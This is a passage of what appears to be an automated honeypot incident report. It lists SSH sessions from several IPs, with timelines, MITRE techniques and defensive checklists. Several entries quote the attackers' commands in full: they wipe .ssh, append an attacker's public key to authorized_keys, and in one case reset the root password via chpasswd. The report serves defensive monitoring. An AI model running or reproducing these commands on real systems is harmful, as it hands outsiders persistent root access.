| `2026-06-02 21:15:02` | `cowrie.command.failed` |
| `2026-06-02 21:15:02` | `cowrie.log.closed` |
| `2026-06-02 21:15:03` | `cowrie.session.params` |
| `2026-06-02 21:15:03` | `cowrie.command.input` |
| `2026-06-02 21:15:03` | `cowrie.session.file_download` |
| `2026-06-02 21:15:03` | `cowrie.log.closed` |
| `2026-06-02 21:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d22696c17a3

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:15 |
| **Last Seen** | 2026-06-02 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:15:04` | `cowrie.session.connect` |
| `2026-06-02 21:15:04` | `cowrie.client.version` |
| `2026-06-02 21:15:04` | `cowrie.client.kex` |
| `2026-06-02 21:15:05` | `cowrie.login.success` |
| `2026-06-02 21:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a64a3bddf945

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:15 |
| **Last Seen** | 2026-06-02 21:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:15:53` | `cowrie.session.connect` |
| `2026-06-02 21:15:53` | `cowrie.client.version` |
| `2026-06-02 21:15:53` | `cowrie.client.kex` |
| `2026-06-02 21:15:54` | `cowrie.login.success` |
| `2026-06-02 21:15:54` | `cowrie.session.params` |
| `2026-06-02 21:15:54` | `cowrie.command.input` |
| `2026-06-02 21:15:54` | `cowrie.command.failed` |
| `2026-06-02 21:15:54` | `cowrie.log.closed` |
| `2026-06-02 21:15:54` | `cowrie.session.params` |
| `2026-06-02 21:15:54` | `cowrie.command.input` |
| `2026-06-02 21:15:55` | `cowrie.session.file_download` |
| `2026-06-02 21:15:55` | `cowrie.log.closed` |
| `2026-06-02 21:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a7b15eb3500

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:15 |
| **Last Seen** | 2026-06-02 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:15:57` | `cowrie.session.connect` |
| `2026-06-02 21:15:57` | `cowrie.client.version` |
| `2026-06-02 21:15:57` | `cowrie.client.kex` |
| `2026-06-02 21:15:57` | `cowrie.login.success` |
| `2026-06-02 21:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91d0ce3f91f

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:16 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0lqylhy7p5qh"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:16:11` | `cowrie.session.connect` |
| `2026-06-02 21:16:11` | `cowrie.client.version` |
| `2026-06-02 21:16:11` | `cowrie.client.kex` |
| `2026-06-02 21:16:12` | `cowrie.login.success` |
| `2026-06-02 21:16:12` | `cowrie.session.params` |
| `2026-06-02 21:16:12` | `cowrie.command.input` |
| `2026-06-02 21:16:12` | `cowrie.command.failed` |
| `2026-06-02 21:16:12` | `cowrie.log.closed` |
| `2026-06-02 21:16:13` | `cowrie.session.params` |
| `2026-06-02 21:16:13` | `cowrie.command.input` |
| `2026-06-02 21:16:13` | `cowrie.session.file_download` |
| `2026-06-02 21:16:13` | `cowrie.log.closed` |
| `2026-06-02 21:16:26` | `cowrie.session.params` |
| `2026-06-02 21:16:26` | `cowrie.command.input` |
| `2026-06-02 21:16:26` | `cowrie.log.closed` |
| `2026-06-02 21:16:29` | `cowrie.session.params` |
| `2026-06-02 21:16:29` | `cowrie.command.input` |
| `2026-06-02 21:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b877b73e76

| Field | Detail |
|---|---|
| **Source IP** | `203.83.234[.]180` |
| **First Seen** | 2026-06-02 21:17 |
| **Last Seen** | 2026-06-02 21:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:17:32` | `cowrie.session.connect` |
| `2026-06-02 21:17:32` | `cowrie.client.version` |
| `2026-06-02 21:17:32` | `cowrie.client.kex` |
| `2026-06-02 21:17:33` | `cowrie.login.success` |
| `2026-06-02 21:17:34` | `cowrie.session.params` |
| `2026-06-02 21:17:34` | `cowrie.command.input` |
| `2026-06-02 21:17:34` | `cowrie.command.failed` |
| `2026-06-02 21:17:34` | `cowrie.log.closed` |
| `2026-06-02 21:17:35` | `cowrie.session.params` |
| `2026-06-02 21:17:35` | `cowrie.command.input` |
| `2026-06-02 21:17:35` | `cowrie.session.file_download` |
| `2026-06-02 21:17:35` | `cowrie.log.closed` |
| `2026-06-02 21:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.234[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.83.234[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def5361723d7

| Field | Detail |
|---|---|
| **Source IP** | `203.83.234[.]180` |
| **First Seen** | 2026-06-02 21:17 |
| **Last Seen** | 2026-06-02 21:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:17:42` | `cowrie.session.connect` |
| `2026-06-02 21:17:42` | `cowrie.client.version` |
| `2026-06-02 21:17:43` | `cowrie.client.kex` |
| `2026-06-02 21:17:43` | `cowrie.login.success` |
| `2026-06-02 21:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.234[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.83.234[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1fb6d441c51

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:17 |
| **Last Seen** | 2026-06-02 21:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:17:44` | `cowrie.session.connect` |
| `2026-06-02 21:17:44` | `cowrie.client.version` |
| `2026-06-02 21:17:44` | `cowrie.client.kex` |
| `2026-06-02 21:17:45` | `cowrie.login.success` |
| `2026-06-02 21:17:45` | `cowrie.session.params` |
| `2026-06-02 21:17:45` | `cowrie.command.input` |
| `2026-06-02 21:17:45` | `cowrie.command.failed` |
| `2026-06-02 21:17:46` | `cowrie.log.closed` |
| `2026-06-02 21:17:46` | `cowrie.session.params` |
| `2026-06-02 21:17:46` | `cowrie.command.input` |
| `2026-06-02 21:17:46` | `cowrie.session.file_download` |
| `2026-06-02 21:17:46` | `cowrie.log.closed` |
| `2026-06-02 21:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acb523551116

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:17 |
| **Last Seen** | 2026-06-02 21:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:17:48` | `cowrie.session.connect` |
| `2026-06-02 21:17:48` | `cowrie.client.version` |
| `2026-06-02 21:17:48` | `cowrie.client.kex` |
| `2026-06-02 21:17:49` | `cowrie.login.success` |
| `2026-06-02 21:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c1e77502a0

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:18 |
| **Last Seen** | 2026-06-02 21:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:18:08` | `cowrie.session.connect` |
| `2026-06-02 21:18:08` | `cowrie.client.version` |
| `2026-06-02 21:18:08` | `cowrie.client.kex` |
| `2026-06-02 21:18:10` | `cowrie.login.success` |
| `2026-06-02 21:18:10` | `cowrie.session.params` |
| `2026-06-02 21:18:10` | `cowrie.command.input` |
| `2026-06-02 21:18:10` | `cowrie.command.failed` |
| `2026-06-02 21:18:11` | `cowrie.log.closed` |
| `2026-06-02 21:18:11` | `cowrie.session.params` |
| `2026-06-02 21:18:11` | `cowrie.command.input` |
| `2026-06-02 21:18:12` | `cowrie.session.file_download` |
| `2026-06-02 21:18:12` | `cowrie.log.closed` |
| `2026-06-02 21:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0136267ecc0

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 21:18 |
| **Last Seen** | 2026-06-02 21:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:18:15` | `cowrie.session.connect` |
| `2026-06-02 21:18:15` | `cowrie.client.version` |
| `2026-06-02 21:18:16` | `cowrie.client.kex` |
| `2026-06-02 21:18:17` | `cowrie.login.success` |
| `2026-06-02 21:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c314ee5d23

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:18 |
| **Last Seen** | 2026-06-02 21:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:18:53` | `cowrie.session.connect` |
| `2026-06-02 21:18:53` | `cowrie.client.version` |
| `2026-06-02 21:18:53` | `cowrie.client.kex` |
| `2026-06-02 21:18:54` | `cowrie.login.success` |
| `2026-06-02 21:18:54` | `cowrie.session.params` |
| `2026-06-02 21:18:54` | `cowrie.command.input` |
| `2026-06-02 21:18:54` | `cowrie.command.failed` |
| `2026-06-02 21:18:54` | `cowrie.log.closed` |
| `2026-06-02 21:18:55` | `cowrie.session.params` |
| `2026-06-02 21:18:55` | `cowrie.command.input` |
| `2026-06-02 21:18:55` | `cowrie.session.file_download` |
| `2026-06-02 21:18:55` | `cowrie.log.closed` |
| `2026-06-02 21:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d497b873d51

| Field | Detail |
|---|---|
| **Source IP** | `118.186.18[.]243` |
| **First Seen** | 2026-06-02 21:19 |
| **Last Seen** | 2026-06-02 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:19:01` | `cowrie.session.connect` |
| `2026-06-02 21:19:01` | `cowrie.client.version` |
| `2026-06-02 21:19:01` | `cowrie.client.kex` |
| `2026-06-02 21:19:02` | `cowrie.login.success` |
| `2026-06-02 21:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.18[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.186.18[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6418d264aa18

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:19 |
| **Last Seen** | 2026-06-02 21:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:19:34` | `cowrie.session.connect` |
| `2026-06-02 21:19:34` | `cowrie.client.version` |
| `2026-06-02 21:19:34` | `cowrie.client.kex` |
| `2026-06-02 21:19:34` | `cowrie.login.success` |
| `2026-06-02 21:19:35` | `cowrie.session.params` |
| `2026-06-02 21:19:35` | `cowrie.command.input` |
| `2026-06-02 21:19:35` | `cowrie.command.failed` |
| `2026-06-02 21:19:35` | `cowrie.log.closed` |
| `2026-06-02 21:19:35` | `cowrie.session.params` |
| `2026-06-02 21:19:35` | `cowrie.command.input` |
| `2026-06-02 21:19:35` | `cowrie.session.file_download` |
| `2026-06-02 21:19:35` | `cowrie.log.closed` |
| `2026-06-02 21:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f94e98f846

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:19 |
| **Last Seen** | 2026-06-02 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:19:37` | `cowrie.session.connect` |
| `2026-06-02 21:19:37` | `cowrie.client.version` |
| `2026-06-02 21:19:37` | `cowrie.client.kex` |
| `2026-06-02 21:19:38` | `cowrie.login.success` |
| `2026-06-02 21:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c073afd023

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:20 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:20:58` | `cowrie.session.connect` |
| `2026-06-02 21:20:58` | `cowrie.client.version` |
| `2026-06-02 21:20:58` | `cowrie.client.kex` |
| `2026-06-02 21:20:58` | `cowrie.login.success` |
| `2026-06-02 21:20:58` | `cowrie.session.params` |
| `2026-06-02 21:20:58` | `cowrie.command.input` |
| `2026-06-02 21:20:58` | `cowrie.command.failed` |
| `2026-06-02 21:20:59` | `cowrie.log.closed` |
| `2026-06-02 21:20:59` | `cowrie.session.params` |
| `2026-06-02 21:20:59` | `cowrie.command.input` |
| `2026-06-02 21:20:59` | `cowrie.session.file_download` |
| `2026-06-02 21:20:59` | `cowrie.log.closed` |
| `2026-06-02 21:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917abaf239d6

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:21 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:21:01` | `cowrie.session.connect` |
| `2026-06-02 21:21:01` | `cowrie.client.version` |
| `2026-06-02 21:21:01` | `cowrie.client.kex` |
| `2026-06-02 21:21:01` | `cowrie.login.success` |
| `2026-06-02 21:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa529f2eb936

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:21 |
| **Last Seen** | 2026-06-02 21:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
